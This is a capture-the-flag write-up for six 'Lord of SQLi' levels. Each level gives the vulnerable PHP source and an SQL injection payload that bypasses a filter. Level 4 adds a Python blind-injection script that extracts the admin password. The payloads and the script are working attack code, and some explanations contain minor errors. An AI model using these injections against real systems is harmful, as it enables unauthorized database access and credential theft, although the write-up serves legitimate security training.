# Lord of Sqli - Writeups

# Level 1 - Gremlin

## Source Code

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

Query :  **select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'**

Here we don’t know the password . So here we just need the query to return 1 row . So we can give 

id as 1 and in the password field we can give ‘ OR ‘1’=’1 .

**Payload** : **id=1&pw=’ OR ‘1’=’1**

# Level 2 - Cobolt

## Source Code

```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

Query : **select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')**

Here we can the id returned from the query should be admin . So we can give id as admin’;— -

**Payload** : **id=admin’;— -**

# Level 3 - Goblin

## Source Code

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

Here quotes are being blocked .

```php
 if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
```

Here it the level will be solved if we fetch the row with id = admin but in the query the id is already set to guest, we cannot change that our injection is at no . So if we give something like -1 OR id=’admin’ . 2 rows will be returned the row with id = guest and id = admin . But here quotes in blocked . But fortunately mysql supports strings to be given in hex without quotes .

**Payload : 1 OR id=0x61646D696E;-- -**

# Level 4 - Orc




```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```


Here we can get the actual password using a blind sql Injection . 



## Exploit Script 


```python
import requests

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGJIJKLMNOPQRSTUVWXYZ1234567890'

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
h = {
    "Cookie" : 'PHPSESSID=r4j44kshvu8qe7nk1kfaq1bddb'
}
pw = ''
index = 1
for i in range(100):
    q = f"?pw=' or id='admin' and length(pw)={str(i)};-- -"
    r = requests.get(url+q,headers=h)
    if 'Hello admin' in r.text:
        print(f'Length of password : {str(i)}')
        break


while 1:
    for i in letters:
        q = f"?pw='  or id='admin' and pw like '{pw}{i}%';-- -"
        r = requests.get(url+q,headers=h)
        if 'Hello admin' in r.text:
            index += 1
            pw += i
            break
        print(q)
        print(f'Password : {pw}{i}',end='\r')
```
##  Level 5 - Wolfman

##### Source code


```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```


##### Here quotes are being blocked . So to get around that we can use /**/ wherever space is needed since mysql treats this as spaces .

##### So the payload becomes : pw='/\**/or/**/id='admin


##  Level 6 - Darkelf

##### Source code


```php
<?php 
  <?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();  
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("darkelf"); 
  highlight_file(__FILE__); 
?>
?>
```

##### Here OR and AND are being blocked . So to get around that we can use || and && instead since the both are equivalent in mysql . 

##### So the payload becomes : pw=' || id='admin
